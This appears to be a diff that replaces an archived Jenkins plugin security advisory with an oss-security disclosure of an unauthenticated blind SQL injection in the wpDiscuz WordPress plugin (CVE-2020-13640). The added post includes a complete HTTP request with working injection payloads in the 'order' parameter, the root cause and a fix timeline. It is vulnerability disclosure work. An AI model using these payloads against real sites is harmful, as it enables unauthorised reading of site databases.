@@ -1,219 +1,120 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/07/02/7
-Message-Id: <818F7702-B078-4C30-95A9-0732819CFF96@beckweb.net>
-Date: Thu, 2 Jul 2020 16:02:59 +0200
-From: Daniel Beck <ml@...kweb.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/07/06/1
+Message-ID: <b97e9440-e032-2a1b-3c75-5f7688927fa7@seclab.cs.msu.su>
+Date: Mon, 6 Jul 2020 02:13:39 +0300
+From: asterite <asterite@...lab.cs.msu.su>
 To: oss-security@...ts.openwall.com
-Subject: Multiple vulnerabilities in Jenkins plugins
+Subject: CVE-2020-13640: WordPress Plugin wpDiscuz <= 5.3.5 SQL injection
 Content-Type: text/plain; charset=utf-8
 
-Jenkins is an open source automation server which enables developers around
-the world to reliably build, test, and deploy their software.
+There is an SQL injection in wpDiscuz plugin [1] version 5.3.5 and
+earlier. This vulnerability is not present in 7.X version line. Plugin
+vendor is gVectors [2]. The vulnerability can be exploited without
+authentication.
 
-The following releases contain fixes for security vulnerabilities:
+## Vulnerability Description ##
 
-* Fortify on Demand Plugin 6.0.1
-* Fortify on Demand Plugin 6.0.0
-* Sonargraph Integration Plugin 3.0.1
-* VncRecorder Plugin 1.35
-* VncViewer Plugin 1.8
+wpDiscuz is a plugin working with comments. It has an endpoint
+"wpdLoadMoreComments" for fetching comments for post with given id. This
+endpoint is vulnerable.
 
-Additionally, we announce unresolved security issues in the following
-plugins:
+This is a boolean-based blind SQL-injection in parameter "order".
+Injected payload gets into "ORDER BY" clause. Injected query output and
+error message is not returned by the server, but attacker can use an
+error-based binary oracle telling whether query succeeded or not: if
+query fails with error, comment list in response will be empty,
+otherwise it will contain comments for post which id is given in a
+request. This means that, to exploit this vulnerability, an attacker
+needs a post with at least one comment (but this is easily achievable
+because usually sites have posts with comments and often commenting is
+enabled for non-logged-in users).
 
-* Compatibility Action Storage Plugin
-* ElasticBox Jenkins Kubernetes CI/CD Plugin
-* GitHub Coverage Reporter Plugin
-* HP ALM Quality Center Plugin
-* Link Column Plugin
-* Slack Upload Plugin
-* Stash Branch Parameter Plugin
-* TestComplete support Plugin
-* White Source Plugin
-* ZAP Pipeline Plugin
-* Zephyr for JIRA Test Management Plugin
+### Example of request with an attack vector: ###
 
-Summaries of the vulnerabilities are below. More details, severity, and
-attribution can be found here:
-https://jenkins.io/security/advisory/2020-07-02/
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+Content-Type: multipart/form-data;
+boundary=---------------------------14434359312532120894700338087
+Content-Length: 848
+Origin: http://localhost
+Connection: close
 
-We provide advance notification for security updates on this mailing list:
-https://groups.google.com/d/forum/jenkinsci-advisories
+-----------------------------14434359312532120894700338087
+Content-Disposition: form-data; name="action"
 
-If you discover security vulnerabilities in Jenkins, please report them as
-described here:
-https://jenkins.io/security/#reporting-vulnerabilities
+wpdLoadMoreComments
+-----------------------------14434359312532120894700338087
+Content-Disposition: form-data; name="offset"
 
----
+1
+-----------------------------14434359312532120894700338087
+Content-Disposition: form-data; name="orderBy"
 
-SECURITY-1775 / CVE-2020-2201
-Sonargraph Integration Plugin 3.0.0 and earlier does not escape the file
-path for the Log file field form validation.
+comment_date_gmt
+-----------------------------14434359312532120894700338087
+Content-Disposition: form-data; name="order"
 
-This results in a stored cross-site scripting (XSS) vulnerability that can
-be exploited by users with Job/Configure permission.
+,  (select case when (ord(SUBSTRING((select SCHEMA_NAME from
+information_schema.schemata limit 1), 1, 1)) = 105) then 1 else
+1*(select table_name from information_schema.tables)end)=1  asc  #
+-----------------------------14434359312532120894700338087
+Content-Disposition: form-data; name="postId"
 
+1234
+-----------------------------14434359312532120894700338087--
 
-SECURITY-1690 / CVE-2020-2202
-Fortify on Demand Plugin provides a list of applicable credentials IDs to
-allow users configuring the plugin to select the one to use.
+here, injected query performs a test of character code of the first
+letter of the name of the first database in MySQL. Usually it's
+"information_schema", so the first letter is "i" (with code 105) and the
+query will succeed and comments for the post will be in returned response.
 
-This functionality does not correctly check permissions in Fortify on
-Demand Plugin 6.0.0 and earlier, allowing any user with Overall/Read
-permission to get a list of valid credentials IDs. Those can be used as
-part of an attack to capture the credentials using another vulnerability.
+An attacker could instead use vector
+",  (select case when (ord(SUBSTRING((select SCHEMA_NAME from
+information_schema.schemata limit 1), 1, 1)) = 106) then 1 else
+1*(select table_name from information_schema.tables)end)=1  asc  #"
+(double quotes for clarity) - in this query check would usually fail
+(char code is compared with incorrect value 106, so, erroneous else
+branch of 'case' will be executed) - so, comment list in response will
+be empty.
 
+(legitimate values of "order" parameter are "asc" and "desc")
 
-SECURITY-1691 / CVE-2020-2203 (CSRF) & CVE-2020-2204 (missing permission check)
-Fortify on Demand Plugin 5.0.1 and earlier does not perform permission
-checks on a method implementing form validation. This allows users with
-Overall/Read access to Jenkins to connect to the globally configured
-Fortify on Demand endpoint using attacker-specified credentials IDs
-obtained through another method.
+## Exploit ##
 
-Additionally, this form validation method does not require POST requests,
-resulting in a cross-site request forgery (CSRF) vulnerability.
+PoC exploit can be found here:
+https://github.com/asterite3/CVE-2020-13640/blob/master/exploit.py
 
+## Cause ##
 
-SECURITY-1728 (1) / CVE-2020-2205
-VncRecorder Plugin 1.25 and earlier does not escape a tool path in the
-`checkVncServ` form validation endpoint accessed e.g. via job configuration
-forms.
+Regarding the cause of vulnerability: if I understood everything
+correctly, the reason is that function "loadMoreComments()" in
+class.WpdiscuzCore.php takes "_POST['order']" unsanitized and puts it to
+"$args['order']", which, after several re-assignments into different
+vars/properties, gets appended to "orderby" parameter in
+"comments_clauses" hook [3] (in method "commentsClauses()" of
+"WpdiscuzCore" class). If I got it right then values affected by
+"comments_clauses" hook are put into SQL query (that fetches comments)
+without further sanitization - so, it's dangerous to let unsanitized
+user input get into them.
 
-This results in a stored cross-site scripting (XSS) vulnerability
-exploitable by Jenkins administrators.
+## Timeline (dd/mm/yyyy) ##
 
+27/05/2020: Reported to vendor
+27/05/2020: CVE assigned
+29/05/2020: Reported to WordPress plugin team
+29/05/2020: Got response from vendor
+12/06/2020: Vendor publishes information about the vulnerability on
+plugin site [4] and WP plugin page [5]
+12/06/2020: Patched version in 5.X line (5.3.6) is released [6]
 
-SECURITY-1728 (2) / CVE-2020-2206
-VncRecorder Plugin 1.25 and earlier does not escape a parameter value in
-the `checkVncServ` form validation endpoint output.
+## References ##
 
-This results in a reflected cross-site scripting (XSS) vulnerability.
+[1] https://wordpress.org/plugins/wpdiscuz/
+[2] https://gvectors.com/
+[3] https://developer.wordpress.org/reference/hooks/comments_clauses/
+[4]
+https://wpdiscuz.com/community/news/security-vulnerability-issue-in-5-3-5-please-udate/
+[5] https://wordpress.org/plugins/wpdiscuz/#developers
+[6] https://plugins.trac.wordpress.org/log/wpdiscuz/tags/5.3.6?rev=2335769
 
-
-SECURITY-1776 / CVE-2020-2207
-VncViewer Plugin 1.7 and earlier does not escape a parameter value in the
-`checkVncServ` form validation endpoint output.
-
-This results in a reflected cross-site scripting (XSS) vulnerability.
-
-
-SECURITY-1627 / CVE-2020-2208
-Slack Upload Plugin 1.7 and earlier stores a secret unencrypted in job
-`config.xml` files as part of its configuration. This secret can be viewed
-by users with Extended Read permission or access to the master file system.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1686 / CVE-2020-2209
-TestComplete support Plugin 2.4.1 and earlier stores a password unencrypted
-in job `config.xml` files as part of its configuration. This password can
-be viewed by users with Extended Read permission or access to the master
-file system.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1656 / CVE-2020-2210
-Stash Branch Parameter Plugin stores Stash API passwords in its global
-configuration file
-`org.jenkinsci.plugins.StashBranchParameter.StashBranchParameterDefinition.xml`
-on the Jenkins master as part of its configuration.
-
-While the password is stored encrypted on disk, it is transmitted in plain
-text as part of the configuration form by Stash Branch Parameter Plugin
-0.3.0 and earlier. This can result in exposure of the password through
-browser extensions, cross-site scripting vulnerabilities, and similar
-situations.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1738 / CVE-2020-2211
-ElasticBox Jenkins Kubernetes CI/CD Plugin 1.3 and earlier does not
-configure its YAML parser to prevent the instantiation of arbitrary types.
-This results in a remote code execution (RCE) vulnerability exploitable by
-users able to provide YAML input files to ElasticBox Jenkins Kubernetes
-CI/CD Plugin's build step.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1632 / CVE-2020-2212
-GitHub Coverage Reporter Plugin 1.8 and earlier stores a GitHub access
-token in plain text in its global configuration file
-`io.jenkins.plugins.gcr.PluginConfiguration.xml`. This can be viewed by
-users with access to the Jenkins master file system.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1630 / CVE-2020-2213
-White Source Plugin 19.1.1 and earlier stores credentials in plain text as
-part of its global configuration file
-`org.whitesource.jenkins.pipeline.WhiteSourcePipelineStep.xml` and job
-`config.xml` files on the Jenkins master. These credentials could be viewed
-by users with Extended Read permission (in the case of job `config.xml`
-files) or access to the master file system.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1811 / CVE-2020-2214
-Jenkins sets the `Content-Security-Policy` header to static files served by
-Jenkins (specifically `DirectoryBrowserSupport`), such as workspaces,
-`/userContent`, or archived artifacts.
-
-ZAP Pipeline Plugin 1.9 and earlier globally disables the
-`Content-Security-Policy` header for static files served by Jenkins. This
-allows cross-site scripting (XSS) attacks by users with the ability to
-control files in workspaces, archived artifacts, etc.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1762 / CVE-2020-2215 (CSRF) & CVE-2020-2216 (missing permission check)
-Zephyr for JIRA Test Management Plugin 1.5 and earlier does not perform a
-permission check in a method implementing form validation. This allows
-users with Overall/Read access to Jenkins to connect to an
-attacker-specified host using attacker-specified username and password.
-
-Additionally, this form validation method does not require POST requests,
-resulting in a cross-site request forgery (CSRF) vulnerability.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1771 / CVE-2020-2217
-Compatibility Action Storage Plugin 1.0 and earlier does not escape the
-content coming from the MongoDB in the `testConnection` form validation
-endpoint. This allows attackers able to update the configured document in
-MongoDB to inject the payload.
-
-This results in a reflected cross-site scripting (XSS) vulnerability.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1576 / CVE-2020-2218
-HP ALM Quality Center Plugin 1.6 and earlier stores a password in plain
-text in its global configuration file
-`org.jenkinsci.plugins.qc.QualityCenterIntegrationRecorder.xml`. This
-password can be viewed by users with access to the Jenkins master file
-system.
-
-As of publication of this advisory, there is no fix.
-
-
-SECURITY-1803 / CVE-2020-2219
-Link Column Plugin allows users with View/Configure permission to add a new
-column to list views that contains a user-configurable link.
-
-Link Column Plugin 1.0 and earlier does not filter the URL for these links,
-allowing the `javascript:` scheme. This results in a stored cross-site
-scripting (XSS) vulnerability exploitable by users able to configure list
-views.
-
-As of publication of this advisory, there is no fix.
 
